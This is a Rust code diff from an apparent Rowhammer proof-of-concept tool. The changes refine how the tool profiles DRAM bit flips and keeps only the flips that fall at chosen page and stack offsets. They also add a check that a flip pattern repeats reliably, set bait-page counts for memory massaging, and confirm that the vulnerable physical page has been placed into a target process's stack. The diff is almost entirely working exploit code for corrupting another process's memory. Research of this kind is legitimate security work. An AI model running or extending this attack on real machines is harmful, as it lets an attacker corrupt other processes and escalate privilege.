@@ -1,4 +1,5 @@
 use std::{
+    collections::HashMap,
     fmt::Debug,
     fs::File,
     io::{stdin, BufReader, BufWriter, Write},
@@ -9,12 +10,13 @@ use std::{
 use anyhow::bail;
 use bs_poc::{
     allocator::hugepage::HugepageAllocator,
-    hammerer::blacksmith::jitter::AggressorPtr,
-    memory::{BitFlip, DataPattern, Initializable},
+    hammerer::{blacksmith::jitter::AggressorPtr, make_hammer, HammerStrategy},
+    memory::{BitFlip, DataPattern, Initializable, VictimMemory},
+    util::PAGE_SHIFT,
+    victim::{stack_process::find_flippy_page, HammerVictimError},
 };
 use bs_poc::{
     allocator::{self, BuddyInfo, ConsecAlloc, ConsecAllocator, Mmap, Pfn},
-    hammerer,
     memory::ConsecCheck,
     victim,
 };
@@ -33,12 +35,13 @@ use bs_poc::{
     util::PAGE_SIZE,
 };
 use bs_poc::{
-    memory::{BytePointer, ConsecBlocks, ConsecCheckBankTiming, ConsecCheckNone, ConsecCheckPfn},
+    memory::{BytePointer, ConsecBlocks, ConsecCheckBankTiming},
     retry,
     util::init_logging_with_progress,
 };
 use clap::Parser;
 use indicatif::{MultiProgress, ProgressBar};
+use itertools::Itertools;
 use log::{info, warn};
 use rand::{rngs::StdRng, SeedableRng};
 use serde::Serialize;
@@ -63,9 +66,6 @@ struct CliArgs {
     /// The mapping ID to load from the `blacksmith` JSON file. Optional argument, will determine most optimal pattern if omitted.
     #[clap(long = "mapping")]
     mapping: Option<String>,
-    /// Some allocation strategies require a check for consecutive memory. This option allows you to specify the type of check to use.
-    #[clap(long = "consec-check", default_value = "bank-timing")]
-    consec_check: ConsecCheckType,
     /// The allocation strategy to use.
     #[clap(long = "alloc-strategy", default_value = "spoiler")]
     alloc_strategy: AllocStrategy,
@@ -98,26 +98,6 @@ struct CliArgs {
     target: Vec<String>,
 }
 
-/// The hammering strategy to use.
-#[derive(clap::ValueEnum, Clone, Debug)]
-pub enum HammerStrategy {
-    /// Use a dummy hammerer. This hammerer flips a bit at a fixed offset.
-    Dummy,
-    /// Use the blacksmith hammerer. This hammerer uses the pattern and mapping determined by `blacksmith` to hammer the target.
-    Blacksmith,
-}
-
-/// The type of consecutive memory check to use.
-#[derive(clap::ValueEnum, Clone, Debug)]
-pub enum ConsecCheckType {
-    /// Measure consecutive memory accesses using bank timing. This will check the allocation against the memory configuration to determine if it is consecutive.
-    BankTiming,
-    /// No consecutive memory check.
-    None,
-    /// Check for consecutive memory accesses using page frame numbers (requires root). Mainly used for debugging, as it assumes a very powerful thread model.
-    Pfn,
-}
-
 /// The type of allocation strategy to use.
 #[derive(clap::ValueEnum, Clone, Debug)]
 pub enum AllocStrategy {
@@ -129,8 +109,8 @@ pub enum AllocStrategy {
     Hugepage,
     /// Allocate consecutive memory using huge pages with randomization. This will return random 4 MB chunks of a 1 GB hugepage.
     HugepageRnd,
-    /// Allocate consecutive memory using `mmap`. This will `mmap` a large buffer and find consecutive memory using the provided `ConsecCheckType`
-    Mmap,
+    /// Allocate consecutive memory using `bank timing`. This will `mmap` a large buffer and find consecutive memory using bank timing check
+    BankTiming,
     /// Allocate a large block of memory and use pagemap to find consecutive blocks
     Pfn,
     /// Allocate consecutive memory using the Spoiler attack. This strategy will measure read-after-write pipeline conflicts to determine consecutive memory.
@@ -140,15 +120,19 @@ pub enum AllocStrategy {
 impl AllocStrategy {
     fn create_allocator(
         &self,
-        consec_checker: ConsecCheck,
         mem_config: MemConfiguration,
         conflict_threshold: u64,
         progress: Option<MultiProgress>,
     ) -> allocator::ConsecAlloc {
         match self {
-            AllocStrategy::BuddyInfo => ConsecAlloc::BuddyInfo(BuddyInfo::new(consec_checker)),
+            AllocStrategy::BuddyInfo => ConsecAlloc::BuddyInfo(BuddyInfo::new(
+                ConsecCheck::BankTiming(ConsecCheckBankTiming::new(mem_config, conflict_threshold)),
+            )),
             AllocStrategy::CoCo => ConsecAlloc::CoCo(CoCo {}),
-            AllocStrategy::Mmap => ConsecAlloc::Mmap(Mmap::new(consec_checker, progress)),
+            AllocStrategy::BankTiming => ConsecAlloc::Mmap(Mmap::new(
+                ConsecCheck::BankTiming(ConsecCheckBankTiming::new(mem_config, conflict_threshold)),
+                progress,
+            )),
             AllocStrategy::Hugepage => ConsecAlloc::Hugepage(HugepageAllocator::default()),
             AllocStrategy::HugepageRnd => ConsecAlloc::HugepageRnd(HugepageRandomized::new(1)),
             AllocStrategy::Pfn => ConsecAlloc::Pfn(Pfn::default()),
@@ -200,21 +184,6 @@ fn cli_ask_pattern(json_filename: String) -> anyhow::Result<String> {
     Ok(pattern)
 }
 
-fn create_consec_checker_from_cli(
-    consec_check: ConsecCheckType,
-    mem_config: MemConfiguration,
-    conflict_threshold: u64,
-    progress: Option<MultiProgress>,
-) -> anyhow::Result<ConsecCheck> {
-    Ok(match consec_check {
-        ConsecCheckType::None => ConsecCheck::None(ConsecCheckNone {}),
-        ConsecCheckType::Pfn => ConsecCheck::Pfn(ConsecCheckPfn {}),
-        ConsecCheckType::BankTiming => ConsecCheck::BankTiming(
-            ConsecCheckBankTiming::new_with_progress(mem_config, conflict_threshold, progress),
-        ),
-    })
-}
-
 struct LoadedPattern {
     pattern: HammeringPattern,
     mapping: PatternAddressMapper,
@@ -245,42 +214,6 @@ fn load_pattern(args: &CliArgs) -> anyhow::Result<LoadedPattern> {
     Ok(LoadedPattern { pattern, mapping })
 }
 
-#[allow(clippy::too_many_arguments)]
-fn make_hammer<'a>(
-    hammerer: &HammerStrategy,
-    pattern: &HammeringPattern,
-    mapping: &PatternAddressMapper,
-    mem_config: MemConfiguration,
-    block_size: usize,
-    memory: &'a ConsecBlocks,
-    attempts: u8,
-    check_each_attempt: bool,
-) -> anyhow::Result<Hammerer<'a>> {
-    let block_shift = block_size.ilog2();
-    let hammerer: Hammerer<'a> = match hammerer {
-        HammerStrategy::Blacksmith => Hammerer::Blacksmith(hammerer::Blacksmith::new(
-            mem_config,
-            pattern,
-            mapping,
-            block_shift as usize,
-            memory,
-            attempts,
-            check_each_attempt,
-        )?),
-        HammerStrategy::Dummy => {
-            let flip = mapping.get_bitflips_relocate(mem_config, block_shift as usize, memory);
-            let flip = flip.concat().pop().unwrap_or(memory.blocks[0].addr(0x42)) as *mut u8;
-            info!(
-                "Running dummy hammerer with flip at VA 0x{:02x}",
-                flip as usize
-            );
-            let hammerer = hammerer::Dummy::new(flip);
-            Hammerer::Dummy(hammerer)
-        }
-    };
-    Ok(hammerer)
-}
-
 #[derive(Debug)]
 struct RoundProfile {
     bit_flips: Vec<BitFlip>,
@@ -296,7 +229,6 @@ struct Profiling {
 fn hammer_profile(
     hammerer: &Hammerer,
     memory: &ConsecBlocks,
-    aggressors: Vec<AggressorPtr>,
     num_rounds: u64,
     progress: Option<MultiProgress>,
 ) -> Profiling {
@@ -305,40 +237,69 @@ fn hammer_profile(
         .map(|p| p.add(ProgressBar::new(num_rounds * 3)));
     let mut rounds = vec![];
 
-    for round in 0..num_rounds * 3 {
-        if let Some(p) = p.as_ref() {
-            p.inc(1)
+    for pattern in [
+        //DataPattern::StripeZero(aggressors.clone()),
+        //DataPattern::StripeOne(aggressors.clone()),
+        DataPattern::Random(Box::new(StdRng::from_seed(rand::random()))),
+        DataPattern::Random(Box::new(StdRng::from_seed(rand::random()))),
+        DataPattern::Random(Box::new(StdRng::from_seed(rand::random()))),
+    ] {
+        for _ in 0..num_rounds {
+            if let Some(p) = p.as_ref() {
+                p.inc(1)
+            }
+            let start = std::time::Instant::now();
+            let mut victim = victim::MemCheck::new(memory, pattern.clone());
+            let result = hammerer.hammer(&mut victim);
+            let duration = std::time::Instant::now() - start;
+            let bit_flips = match result {
+                Ok(result) => {
+                    info!(
+                        "Profiling hammering round successful at attempt {}: {:?}",
+                        result.attempt, result.victim_result
+                    );
+                    result.victim_result
+                }
+                Err(e) => {
+                    warn!("Profiling hammering round not successful: {:?}", e);
+                    vec![]
+                }
+            };
+            rounds.push(RoundProfile {
+                bit_flips,
+                pattern: pattern.clone(),
+                duration,
+            });
         }
-        let start = std::time::Instant::now();
-        let pattern = match round % 3 {
-            0 => DataPattern::StripeZero(aggressors.clone()),
-            1 => DataPattern::StripeOne(aggressors.clone()),
-            2 => DataPattern::Random(Box::new(StdRng::from_seed(rand::random()))),
-            _ => unreachable!("Congratulations! Your computer re-invented math"),
-        };
-        let mut victim = victim::MemCheck::new(memory, pattern.clone());
-        let result = hammerer.hammer(&mut victim);
-        let duration = std::time::Instant::now() - start;
-        let bit_flips = match result {
-            Ok(result) => {
-                info!(
-                    "Profiling hammering round successful at attempt {}: {:?}",
-                    result.attempt, result.victim_result
-                );
-                result.victim_result
-            }
-            Err(e) => {
-                warn!("Profiling hammering round not successful: {:?}", e);
-                vec![]
-            }
-        };
-        rounds.push(RoundProfile {
-            bit_flips,
-            pattern,
-            duration,
-        });
     }
     Profiling { rounds }
+}
+
+// find profile entry with bitflips in needed range
+#[derive(Clone, Debug)]
+struct TargetOffset {
+    page_offset: usize,
+    stack_offset: usize,
+    target_size: usize,
+}
+fn filter_flips<'a>(
+    bit_flips: Vec<&'a BitFlip>,
+    targets: &[TargetOffset],
+) -> Vec<(&'a BitFlip, usize)> {
+    bit_flips
+        .into_iter()
+        .filter_map(|candidate| {
+            let pg_offset = candidate.addr & 0xfff;
+            let matched = targets.iter().find(|&target| {
+                let addr = target.page_offset & 0xfff;
+                addr <= pg_offset && pg_offset < addr + target.target_size
+            });
+            if matched.is_some() {
+                info!("Matched candidate {:?} to target {:?}", candidate, matched);
+            }
+            matched.map(|offset| (candidate, offset.stack_offset))
+        })
+        .collect_vec()
 }
 
 unsafe fn _main() -> anyhow::Result<()> {
@@ -352,18 +313,9 @@ unsafe fn _main() -> anyhow::Result<()> {
 
     info!("Args: {:?}", args);
 
-    let consec_checker = create_consec_checker_from_cli(
-        args.consec_check,
-        mem_config,
-        config.threshold,
-        Some(progress.clone()),
-    )?;
-    let mut alloc_strategy = args.alloc_strategy.create_allocator(
-        consec_checker,
-        mem_config,
-        config.threshold,
-        Some(progress.clone()),
-    );
+    let mut alloc_strategy =
+        args.alloc_strategy
+            .create_allocator(mem_config, config.threshold, Some(progress.clone()));
     let block_size = alloc_strategy.block_size();
 
     let repetitions = match args.repeat {
@@ -423,7 +375,6 @@ unsafe fn _main() -> anyhow::Result<()> {
         let profiling = hammer_profile(
             &profile_hammer,
             &memory,
-            aggressors,
             args.profiling_rounds,
             Some(progress.clone()),
         );
@@ -464,30 +415,47 @@ unsafe fn _main() -> anyhow::Result<()> {
         } else {
             info!("Profiling done. Found bitflips in {:?}", bit_flips);
         }
+
+        let targets = [
+            TargetOffset {
+                page_offset: 0x700,
+                stack_offset: 31,
+                target_size: 448,
+            },
+            TargetOffset {
+                page_offset: 0xa10,
+                stack_offset: 31,
+                target_size: 256,
+            },
+        ];
+        // the number of bait pages to release after the target page (for memory massaging)
+        let bait_count_after = HashMap::from([(29, 0), (30, 26), (31, 7), (32, 28)]);
+
         // Find address to use for injection by majority vote
-        let majority = bit_flips
-            .iter()
-            .map(|b| b.addr)
-            .fold(std::collections::HashMap::new(), |mut counts, addr| {
-                *counts.entry(addr).or_insert(0) += 1;
-                counts
-            })
-            .into_iter()
-            .max_by_key(|(_, count)| *count);
-        let (addr, count) = match majority {
-            Some((addr, count)) => (addr, count),
+        let (addr, stack_offset) = match filter_flips(bit_flips, &targets).last().cloned() {
+            Some((flip, offset)) => (flip.addr, offset),
             None => {
                 warn!("No vulnerable addresses found");
                 memory.dealloc();
                 continue;
             }
         };
+        /*let addr = match bit_flips.first() {
+            Some(flip) => flip.addr,
+            None => {
+                warn!("No vulnerable addresses found");
+                memory.dealloc();
+                continue;
+            }
+        };
+        let stack_offset = 31;*/
         info!(
-            "Using address {:?} (phys {:x}) for injection, occured {} times",
+            "Using address {:x} (phys {:x}) for injection at stack offset {}",
             addr,
             (addr as *const u8).pfn().unwrap_or_default(),
-            count
+            stack_offset
         );
+
         // find round with flips in `addr`, get seed
         let pattern = profiling
             .rounds
@@ -496,23 +464,69 @@ unsafe fn _main() -> anyhow::Result<()> {
             .expect("no round with flips in addr")
             .pattern
             .clone();
-        memory.initialize(pattern);
+        let success = reproduce_pattern(&profile_hammer, pattern.clone(), &memory, 10);
+        match success {
+            Ok(success) => {
+                info!("Reproduced pattern {} times", success);
+                if success < 5 {
+                    warn!("Failed to reproduce pattern at least 5 times");
+                    memory.dealloc();
+                    continue;
+                }
+            }
+            Err(e) => {
+                warn!("Failed to reproduce pattern: {:?}", e);
+                memory.dealloc();
+                continue;
+            }
+        }
+        memory.initialize(pattern.clone());
         let addr = addr & !0xfff; // mask out the lowest 12 bits
+        let target_pfn = (addr as *const u8).pfn().expect("no pfn") >> PAGE_SHIFT;
 
         let victim = if args.target.is_empty() {
             None
         } else {
-            //Some(victim::Process::new(&args.target)?)
+            // refactor me. This is way too deep.
             match victim::StackProcess::new(
                 &args.target,
                 InjectionConfig {
                     flippy_page: addr as *mut libc::c_void,
                     flippy_page_size: PAGE_SIZE,
-                    bait_count_after: 7,
+                    bait_count_after: bait_count_after
+                        .get(&stack_offset)
+                        .copied()
+                        .expect("unsupported stack offset"),
                     bait_count_before: 0,
                 },
             ) {
-                Ok(p) => Some(p),
+                Ok(p) => {
+                    let flippy_page = find_flippy_page(target_pfn, p.pid());
+                    match flippy_page {
+                        Ok(Some(flippy_page)) => {
+                            info!("Flippy page found: {:?}", flippy_page);
+                            if flippy_page.region_offset != stack_offset {
+                                warn!(
+                                    "Flippy page offset mismatch: {} != {}",
+                                    flippy_page.region_offset, stack_offset
+                                );
+                                p.stop();
+                                continue 'repeat;
+                            }
+                            Some(p)
+                        }
+                        Ok(None) => {
+                            warn!("Flippy page not found");
+                            p.stop();
+                            continue 'repeat;
+                        }
+                        Err(e) => {
+                            warn!("Error finding flippy page: {:?}", e);
+                            p.stop();
+                            continue 'repeat;
+                        }
+                    }
+                }
                 Err(e) => {
                     warn!("Failed to create victim: {:?}", e);
                     continue 'repeat;
@@ -552,6 +566,85 @@ unsafe fn _main() -> anyhow::Result<()> {
     );
 }
 
+fn reproduce_pattern<H: Hammering>(
+    hammer: &H,
+    pattern: DataPattern,
+    memory: &dyn VictimMemory,
+    rounds: usize,
+) -> anyhow::Result<u8> {
+    // reproduce pattern 10 times
+    let mut victim = victim::MemCheck::new(memory, pattern.clone());
+    let mut success = 0;
+    for i in 0..rounds {
+        let result = hammer.hammer(&mut victim);
+        match result {
+            Ok(result) => {
+                if result.victim_result.is_empty() {
+                    warn!("Failed to reproduce pattern in run {}: no flips", i);
+                } else {
+                    info!(
+                        "Reproduced pattern in run {}: {:?}",
+                        i, result.victim_result
+                    );
+                    success += 1;
+                }
+            }
+            Err(e) => {
+                warn!("Failed to reproduce pattern in run {}: {:?}", i, e);
+            }
+        }
+    }
+    Ok(success)
+}
+
 fn main() -> anyhow::Result<()> {
     unsafe { _main() }
+}
+
+#[test]
+fn test_filter_flips_match_start() {
+    let flips = [BitFlip {
+        addr: 0x700,
+        bitmask: 0x1,
+        data: 0xff,
+    }];
+    let targets = [TargetOffset {
+        page_offset: 0x700,
+        stack_offset: 31,
+        target_size: 32,
+    }];
+    let filtered = filter_flips(flips.iter().collect(), &targets);
+    assert_eq!(filtered.len(), 1);
+}
+
+#[test]
+fn test_filter_flips_match_end() {
+    let flips = [BitFlip {
+        addr: 0x700,
+        bitmask: 0x1,
+        data: 0xff,
+    }];
+    let target = TargetOffset {
+        page_offset: 0x600,
+        stack_offset: 31,
+        target_size: 0x101,
+    };
+    let filtered = filter_flips(flips.iter().collect(), &[target]);
+    assert_eq!(filtered.len(), 1);
+}
+
+#[test]
+fn test_filter_flips_nomatch() {
+    let flips = [BitFlip {
+        addr: 0x700,
+        bitmask: 0x1,
+        data: 0xff,
+    }];
+    let target = TargetOffset {
+        page_offset: 0x600,
+        stack_offset: 31,
+        target_size: 0x100,
+    };
+    let filtered = filter_flips(flips.iter().collect(), &[target]);
+    assert_eq!(filtered.len(), 0);
 }
